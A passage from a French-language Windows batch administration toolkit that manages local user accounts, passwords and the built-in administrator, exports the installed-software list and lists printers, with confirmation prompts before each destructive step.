>> "%TEMP%\um_input.ps1" echo [System.IO.File]::WriteAllText("$env:TEMP\um_result.txt", $buf)
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\um_input.ps1"
del /f /q "%TEMP%\um_input.ps1" 2>nul
set /p NEWU=<"%TEMP%\um_result.txt"
del /f /q "%TEMP%\um_result.txt" 2>nul
if "%NEWU%"=="" goto um_menu
set "SETPWD="
> "%TEMP%\yn_confirm.ps1" echo $sel = 1
>> "%TEMP%\yn_confirm.ps1" echo function Show-Choice {
>> "%TEMP%\yn_confirm.ps1" echo     param($s)
>> "%TEMP%\yn_confirm.ps1" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo     Write-Host "  Affecter un mot de passe maintenant ?  " -NoNewline
>> "%TEMP%\yn_confirm.ps1" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "%TEMP%\yn_confirm.ps1" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo while ($true) {
>> "%TEMP%\yn_confirm.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\yn_confirm.ps1" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "%TEMP%\yn_confirm.ps1" echo         $sel = 1 - $sel
>> "%TEMP%\yn_confirm.ps1" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo         Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "%TEMP%\yn_confirm.ps1" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Write-Host ""
>> "%TEMP%\yn_confirm.ps1" echo exit $sel
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\yn_confirm.ps1"
set "_YN=%errorlevel%"
del /f /q "%TEMP%\yn_confirm.ps1" 2>nul
if "%_YN%"=="1" goto um_add_no_pwd

> "%TEMP%\um_input.ps1" echo $buf = ""
>> "%TEMP%\um_input.ps1" echo Write-Host "  Mot de passe : " -NoNewline -ForegroundColor Cyan
>> "%TEMP%\um_input.ps1" echo while ($true) {
>> "%TEMP%\um_input.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\um_input.ps1" echo     if ($k.Key -eq 'Enter') { break }
>> "%TEMP%\um_input.ps1" echo     elseif ($k.Key -eq 'Escape') { exit 2 }
>> "%TEMP%\um_input.ps1" echo     elseif ($k.Key -eq 'Backspace') {
>> "%TEMP%\um_input.ps1" echo         if ($buf.Length -gt 0) { $buf = $buf.Substring(0, $buf.Length - 1); Write-Host "`b `b" -NoNewline }
>> "%TEMP%\um_input.ps1" echo     } else {
>> "%TEMP%\um_input.ps1" echo         $c = $k.KeyChar
>> "%TEMP%\um_input.ps1" echo         if ($c -ge ' ') { $buf += $c; Write-Host "*" -NoNewline }
>> "%TEMP%\um_input.ps1" echo     }
>> "%TEMP%\um_input.ps1" echo }
>> "%TEMP%\um_input.ps1" echo Write-Host ""
>> "%TEMP%\um_input.ps1" echo $ss = ConvertTo-SecureString $buf -AsPlainText -Force
>> "%TEMP%\um_input.ps1" echo try { New-LocalUser -Name $env:NEWU -Password $ss -PasswordNeverExpires -ErrorAction Stop; exit 0 }
>> "%TEMP%\um_input.ps1" echo catch { Write-Host $_.Exception.Message -ForegroundColor Red; exit 1 }
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\um_input.ps1"
set "_ADDERR=%errorlevel%"
del /f /q "%TEMP%\um_input.ps1" 2>nul
if "%_ADDERR%"=="2" goto um_menu
if not "%_ADDERR%"=="0" (echo Echec de creation de l'utilisateur. & pause & goto um_menu)
goto um_add_check

:um_add_no_pwd
net user "%NEWU%" "" /add /y

:um_add_check
if not %errorlevel%==0 (
    echo Echec de creation de l'utilisateur.
    pause
    goto um_menu
)

set "ADDADM="
> "%TEMP%\yn_confirm.ps1" echo $sel = 1
>> "%TEMP%\yn_confirm.ps1" echo function Show-Choice {
>> "%TEMP%\yn_confirm.ps1" echo     param($s)
>> "%TEMP%\yn_confirm.ps1" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo     Write-Host "  Ajouter aux Administrateurs ?  " -NoNewline
>> "%TEMP%\yn_confirm.ps1" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "%TEMP%\yn_confirm.ps1" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo while ($true) {
>> "%TEMP%\yn_confirm.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\yn_confirm.ps1" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "%TEMP%\yn_confirm.ps1" echo         $sel = 1 - $sel
>> "%TEMP%\yn_confirm.ps1" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo         Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "%TEMP%\yn_confirm.ps1" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Write-Host ""
>> "%TEMP%\yn_confirm.ps1" echo exit $sel
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\yn_confirm.ps1"
set "_YN=%errorlevel%"
del /f /q "%TEMP%\yn_confirm.ps1" 2>nul
if "%_YN%"=="0" net localgroup "%UM_ADMIN_GROUP%" "%NEWU%" /add
echo.
echo [OK] Utilisateur cree avec succes.
pause
goto um_menu

:um_del
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "SUPPRIMER UN UTILISATEUR" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "DELU=!user_arr[%res%]!"
if not defined DELU goto um_menu

cls
echo.
echo ======================================================
echo ATTENTION : Vous allez supprimer l'utilisateur '%DELU%'
echo ET TOUT SON ESPACE SUR LE DISQUE (Images, Documents, Bureau...) !
echo ======================================================
echo.
> "%TEMP%\yn_confirm.ps1" echo $sel = 1
>> "%TEMP%\yn_confirm.ps1" echo function Show-Choice {
>> "%TEMP%\yn_confirm.ps1" echo     param($s)
>> "%TEMP%\yn_confirm.ps1" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo     Write-Host "  Confirmer la suppression totale ?  " -NoNewline
>> "%TEMP%\yn_confirm.ps1" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "%TEMP%\yn_confirm.ps1" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo while ($true) {
>> "%TEMP%\yn_confirm.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\yn_confirm.ps1" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "%TEMP%\yn_confirm.ps1" echo         $sel = 1 - $sel
>> "%TEMP%\yn_confirm.ps1" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo         Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "%TEMP%\yn_confirm.ps1" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Write-Host ""
>> "%TEMP%\yn_confirm.ps1" echo exit $sel
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\yn_confirm.ps1"
set "_YN=%errorlevel%"
del /f /q "%TEMP%\yn_confirm.ps1" 2>nul
if "%_YN%"=="1" (
    echo [X] Operation annulee.
    pause
    goto um_menu
)

echo Suppression du compte Windows en cours...
net localgroup "%UM_ADMIN_GROUP%" "%DELU%" /delete >nul 2>nul
net user "%DELU%" /delete

if not %errorlevel%==0 (
    echo [ECHEC] Impossible de supprimer le compte utilisateur '%DELU%'.
    pause
    goto um_menu
)

echo [OK] Utilisateur Windows supprime.
echo.
set "TMP_PS1=%temp%\wipe_profile_%RANDOM%.ps1"

echo param($u, $l) > "%TMP_PS1%"
echo $arg='/c rmdir /s /q "'+$u+'" ^>^> "'+$l+'" 2^>^&1' >> "%TMP_PS1%"
echo "RAPPORT: Nettoyage et suppression definitive du dossier "+$u ^| Out-File -Encoding UTF8 $l >> "%TMP_PS1%"
echo $p=Start-Process 'cmd.exe' -ArgumentList $arg -PassThru -WindowStyle Hidden >> "%TMP_PS1%"
echo $f=@('-', '\', '^|', '/') >> "%TMP_PS1%"
echo $i=0 >> "%TMP_PS1%"
echo while(-not $p.HasExited) { >> "%TMP_PS1%"
echo     Write-Host -NoNewline "`r[ $($f[$i]) ] (Journal dispo sur le Bureau) Effacement des fichiers...   " -ForegroundColor Cyan >> "%TMP_PS1%"
echo     $i=($i+1) %% 4 >> "%TMP_PS1%"
echo     Start-Sleep -Milliseconds 150 >> "%TMP_PS1%"
echo } >> "%TMP_PS1%"
echo Write-Host "`r[ OK ] Dossier personnel efface. L'utilisateur a completement disparu.                      " -ForegroundColor Green >> "%TMP_PS1%"

set "LOGFILE=%USERPROFILE%\Desktop\Suppression_Profil_%DELU%.log"
powershell -NoProfile -ExecutionPolicy Bypass -File "%TMP_PS1%" "C:\Users\%DELU%" "%LOGFILE%"
del /f /q "%TMP_PS1%" >nul 2>&1

if exist "C:\Users\%DELU%" (
    echo.
    echo [!] NOTE: Certains fichiers verrouilles par l'OS n'ont pas pu
    echo etre effaces automatiquement ^(voir journal sur le Bureau^).
)

pause
goto um_menu

:um_reset
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "AJOUTER/MODIFIER LE MOT DE PASSE" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "RUSER=!user_arr[%res%]!"
if not defined RUSER goto um_menu

echo.
set /p RNEWP=Nouveau mot de passe ^> 
set /p RNEWP2=Confirmez le mot de passe ^> 
if not "%RNEWP%"=="%RNEWP2%" (
    echo Les mots de passe ne correspondent pas.
    pause
    goto um_menu
)
net user "%RUSER%" "%RNEWP%"
if not %errorlevel%==0 (
    echo Echec de la mise a jour du mot de passe.
    pause
    goto um_menu
)

echo Mot de passe mis a jour.
> "%TEMP%\yn_confirm.ps1" echo $sel = 1
>> "%TEMP%\yn_confirm.ps1" echo function Show-Choice {
>> "%TEMP%\yn_confirm.ps1" echo     param($s)
>> "%TEMP%\yn_confirm.ps1" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo     Write-Host "  Exiger le changement au prochain logon ?  " -NoNewline
>> "%TEMP%\yn_confirm.ps1" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "%TEMP%\yn_confirm.ps1" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo while ($true) {
>> "%TEMP%\yn_confirm.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\yn_confirm.ps1" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "%TEMP%\yn_confirm.ps1" echo         $sel = 1 - $sel
>> "%TEMP%\yn_confirm.ps1" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo         Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "%TEMP%\yn_confirm.ps1" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Write-Host ""
>> "%TEMP%\yn_confirm.ps1" echo exit $sel
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\yn_confirm.ps1"
set "_YN=%errorlevel%"
del /f /q "%TEMP%\yn_confirm.ps1" 2>nul
if "%_YN%"=="1" goto um_reset_end

powershell -NoProfile -ExecutionPolicy Bypass -Command "$u=[ADSI]('WinNT://' + $env:COMPUTERNAME + '/%RUSER%,user'); $u.PasswordExpired=1; $u.SetInfo()"
echo Obligation de changement au prochain logon active.

:um_reset_end
pause
goto um_menu

:um_remove_pwd
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "SUPPRIMER MDP (AUTO-LOGIN)" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "RUSER=!user_arr[%res%]!"
if not defined RUSER goto um_menu

echo.
echo ======================================================
echo ATTENTION : Vous allez supprimer le mot de passe de '%RUSER%' !
echo Cela permettra a toute personne d'y acceder sans mot de passe a l'allumage.
echo.
> "%TEMP%\yn_confirm.ps1" echo $sel = 1
>> "%TEMP%\yn_confirm.ps1" echo function Show-Choice {
>> "%TEMP%\yn_confirm.ps1" echo     param($s)
>> "%TEMP%\yn_confirm.ps1" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo     Write-Host "  Supprimer le mot de passe ?  " -NoNewline
>> "%TEMP%\yn_confirm.ps1" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "%TEMP%\yn_confirm.ps1" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo while ($true) {
>> "%TEMP%\yn_confirm.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\yn_confirm.ps1" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "%TEMP%\yn_confirm.ps1" echo         $sel = 1 - $sel
>> "%TEMP%\yn_confirm.ps1" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo         Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "%TEMP%\yn_confirm.ps1" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Write-Host ""
>> "%TEMP%\yn_confirm.ps1" echo exit $sel
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\yn_confirm.ps1"
set "_YN=%errorlevel%"
del /f /q "%TEMP%\yn_confirm.ps1" 2>nul
if "%_YN%"=="1" (
    echo [X] Operation annulee.
    pause
    goto um_menu
)

net user "%RUSER%" "" >nul 2>&1
if %errorlevel%==0 (
    echo [OK] Mot de passe de l'utilisateur '%RUSER%' supprime avec succes.
) else (
    echo [ECHEC] Impossible de supprimer le mot de passe de '%RUSER%'.
)
pause
goto um_menu

:um_superadmin
set "SA_NAME="
set "SA_ENABLED=False"
for /f "usebackq tokens=*" %%N in (`powershell -NoProfile -Command "Get-LocalUser | Where-Object { $_.SID -like '*-500' } | Select-Object -ExpandProperty Name"`) do set "SA_NAME=%%N"
for /f "usebackq tokens=*" %%E in (`powershell -NoProfile -Command "(Get-LocalUser | Where-Object { $_.SID -like '*-500' }).Enabled"`) do set "SA_ENABLED=%%E"
if not defined SA_NAME (
    echo [ERREUR] Compte built-in administrateur introuvable.
    pause
    goto um_menu
)
if /i "!SA_ENABLED!"=="True" goto um_sa_disable
goto um_sa_enable

:um_sa_disable
cls
echo.
echo  Compte [!SA_NAME!] (RID-500) : ACTIF
echo.
> "%TEMP%\yn_confirm.ps1" echo $sel = 1
>> "%TEMP%\yn_confirm.ps1" echo function Show-Choice {
>> "%TEMP%\yn_confirm.ps1" echo     param($s)
>> "%TEMP%\yn_confirm.ps1" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo     Write-Host "  Desactiver le Super Administrateur ?  " -NoNewline
>> "%TEMP%\yn_confirm.ps1" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "%TEMP%\yn_confirm.ps1" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo while ($true) {
>> "%TEMP%\yn_confirm.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\yn_confirm.ps1" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "%TEMP%\yn_confirm.ps1" echo         $sel = 1 - $sel
>> "%TEMP%\yn_confirm.ps1" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo         Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "%TEMP%\yn_confirm.ps1" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Write-Host ""
>> "%TEMP%\yn_confirm.ps1" echo exit $sel
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\yn_confirm.ps1"
set "_YN=%errorlevel%"
del /f /q "%TEMP%\yn_confirm.ps1" 2>nul
if "%_YN%"=="1" goto um_menu
net user "!SA_NAME!" /active:no
if !errorlevel!==0 (echo [OK] Compte "!SA_NAME!" desactive avec succes.) else (echo [ECHEC] Impossible de desactiver le compte.)
pause
goto um_menu

:um_sa_enable
cls
echo.
echo  Compte [!SA_NAME!] (RID-500) : INACTIF
echo.
> "%TEMP%\yn_confirm.ps1" echo $sel = 1
>> "%TEMP%\yn_confirm.ps1" echo function Show-Choice {
>> "%TEMP%\yn_confirm.ps1" echo     param($s)
>> "%TEMP%\yn_confirm.ps1" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo     Write-Host "  Activer le Super Administrateur ?  " -NoNewline
>> "%TEMP%\yn_confirm.ps1" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "%TEMP%\yn_confirm.ps1" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo while ($true) {
>> "%TEMP%\yn_confirm.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\yn_confirm.ps1" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "%TEMP%\yn_confirm.ps1" echo         $sel = 1 - $sel
>> "%TEMP%\yn_confirm.ps1" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo         Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "%TEMP%\yn_confirm.ps1" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Write-Host ""
>> "%TEMP%\yn_confirm.ps1" echo exit $sel
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\yn_confirm.ps1"
set "_YN=%errorlevel%"
del /f /q "%TEMP%\yn_confirm.ps1" 2>nul
if "%_YN%"=="1" goto um_menu
> "%TEMP%\um_input.ps1" echo $buf = ""
>> "%TEMP%\um_input.ps1" echo Write-Host "  Mot de passe pour le Super Administrateur : " -NoNewline -ForegroundColor Cyan
>> "%TEMP%\um_input.ps1" echo while ($true) {
>> "%TEMP%\um_input.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\um_input.ps1" echo     if ($k.Key -eq 'Enter') { break }
>> "%TEMP%\um_input.ps1" echo     elseif ($k.Key -eq 'Escape') { exit 2 }
>> "%TEMP%\um_input.ps1" echo     elseif ($k.Key -eq 'Backspace') {
>> "%TEMP%\um_input.ps1" echo         if ($buf.Length -gt 0) { $buf = $buf.Substring(0, $buf.Length - 1); Write-Host "`b `b" -NoNewline }
>> "%TEMP%\um_input.ps1" echo     } else {
>> "%TEMP%\um_input.ps1" echo         $c = $k.KeyChar
>> "%TEMP%\um_input.ps1" echo         if ($c -ge ' ') { $buf += $c; Write-Host "*" -NoNewline }
>> "%TEMP%\um_input.ps1" echo     }
>> "%TEMP%\um_input.ps1" echo }
>> "%TEMP%\um_input.ps1" echo Write-Host ""
>> "%TEMP%\um_input.ps1" echo try {
>> "%TEMP%\um_input.ps1" echo     $u = Get-LocalUser ^| Where-Object { $_.SID -like '*-500' } ^| Select-Object -First 1
>> "%TEMP%\um_input.ps1" echo     $ss = ConvertTo-SecureString $buf -AsPlainText -Force
>> "%TEMP%\um_input.ps1" echo     Set-LocalUser -Name $u.Name -Password $ss
>> "%TEMP%\um_input.ps1" echo     Enable-LocalUser -Name $u.Name
>> "%TEMP%\um_input.ps1" echo     Write-Host "[OK] Compte $($u.Name) active avec succes." -ForegroundColor Green
>> "%TEMP%\um_input.ps1" echo     exit 0
>> "%TEMP%\um_input.ps1" echo } catch { Write-Host $_.Exception.Message -ForegroundColor Red; exit 1 }
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\um_input.ps1"
set "_ERR=%errorlevel%"
del /f /q "%TEMP%\um_input.ps1" 2>nul
if "%_ERR%"=="2" goto um_menu
if not "%_ERR%"=="0" echo [ECHEC] Impossible d'activer le compte.
pause
goto um_menu

:um_show_active
echo.
echo Utilisateurs actifs:
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-LocalUser | Where-Object Enabled | Sort-Object Name | Select-Object -ExpandProperty Name | ForEach-Object { $_ }" 2>nul
echo.
goto :eof

:um_exit
endlocal
goto system_tools
REM ================= End Embedded: Gestion des utilisateurs locaux =================

REM ===================================================================
REM              EXPORT LISTE DES LOGICIELS INSTALLES
REM ===================================================================
:sys_export_software
cls
echo ================================================
echo   EXPORT LISTE DES LOGICIELS INSTALLES
echo ================================================
echo.
echo  Choix du format d'export...
echo.
set "opts=Fichier TXT (lisible)~Liste simple texte sur le Bureau;Fichier CSV (Excel)~Format tableur avec colonnes separees par virgules"
call :DynamicMenu "EXPORT LOGICIELS INSTALLES" "%opts%"
set "sw_fmt=%errorlevel%"
if "%sw_fmt%"=="0" goto sys_export_menu

cls
echo ================================================
echo   ANALYSE DES LOGICIELS EN COURS...
echo ================================================
echo.
echo  [1/2] Interrogation du registre Windows...

if "%sw_fmt%"=="1" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%USERPROFILE%\Desktop\Logiciels_Installes.txt'; $p=@('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'); $apps=($p | ForEach-Object { Get-ItemProperty $_ -EA SilentlyContinue } | Where-Object { $_.DisplayName } | Sort-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher -Unique); $nl=[Environment]::NewLine; $sep=New-Object string '=',60; $h='LISTE DES LOGICIELS INSTALLES - '+(Get-Date -Format 'dd/MM/yyyy HH:mm')+$nl+'Ordinateur : '+$env:COMPUTERNAME+$nl+'Total      : '+$apps.Count+' logiciels'+$nl+$sep; $h | Out-File $f -Encoding UTF8; $apps | ForEach-Object { '[+] '+$_.DisplayName+' v'+$_.DisplayVersion+' | '+$_.Publisher } | Out-File $f -Encoding UTF8 -Append; Write-Host ('  [OK] '+$apps.Count+' logiciels exportes.') -f Green"
    echo.
    echo  [2/2] Fichier TXT cree sur le Bureau !
    echo.
    echo  Fichier : Logiciels_Installes.txt
) else (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%USERPROFILE%\Desktop\Logiciels_Installes.csv'; $p=@('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'); $apps=($p | ForEach-Object { Get-ItemProperty $_ -EA SilentlyContinue } | Where-Object { $_.DisplayName } | Sort-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher,InstallDate -Unique); $apps | Export-Csv $f -NoTypeInformation -Encoding UTF8 -Delimiter ';'; Write-Host ('  [OK] '+$apps.Count+' logiciels exportes en CSV.') -f Green"
    echo.
    echo  [2/2] Fichier CSV cree sur le Bureau !
    echo.
    echo  Fichier : Logiciels_Installes.csv
    echo  Ouvrez-le avec Excel ou LibreOffice Calc.
)
echo.
pause
goto sys_export_menu

REM ===================================================================
REM              GESTIONNAIRE D'IMPRIMANTES
REM ===================================================================
:sys_print_manager
call :AutoMenu "GESTIONNAIRE D'IMPRIMANTES" "print_list;print_clear_queue;print_remove;print_restart_spooler"
if "%errorlevel%"=="0" goto system_tools
goto !AutoMenu_Target!

:sys_print_manager_old_unused
cls
set "opts=Lister les imprimantes installees~Affiche toutes les imprimantes et leur statut;Vider la file d'attente~Supprime tous les travaux d'impression bloques (SPOOLER);Supprimer une imprimante~Retire completement une imprimante du systeme;Redemarrer le service Spooler~Relance le gestionnaire d'impression Windows"
call :DynamicMenu "GESTIONNAIRE D'IMPRIMANTES" "%opts%"
set "pr_choice=%errorlevel%"

if "%pr_choice%"=="1" goto print_list
if "%pr_choice%"=="2" goto print_clear_queue
if "%pr_choice%"=="3" goto print_remove
if "%pr_choice%"=="4" goto print_restart_spooler
if "%pr_choice%"=="0" goto system_tools
goto sys_print_manager

:print_list
cls
echo ================================================
echo   IMPRIMANTES INSTALLEES
echo ================================================
echo.
powershell -NoProfile -Command "Get-Printer | ForEach-Object { $jobs=(Get-PrintJob -PrinterName $_.Name -EA SilentlyContinue).Count; $j=if($jobs){$jobs}else{0}; Write-Host (' [+] '+$_.Name) -f Cyan -NoNewline; Write-Host (' | Statut: '+$_.PrinterStatus+' | Travaux en attente: '+$j) -f $(if($j -gt 0){'Yellow'}else{'Gray'}) }"
echo.
pause
goto sys_print_manager

:print_clear_queue
cls
echo ================================================
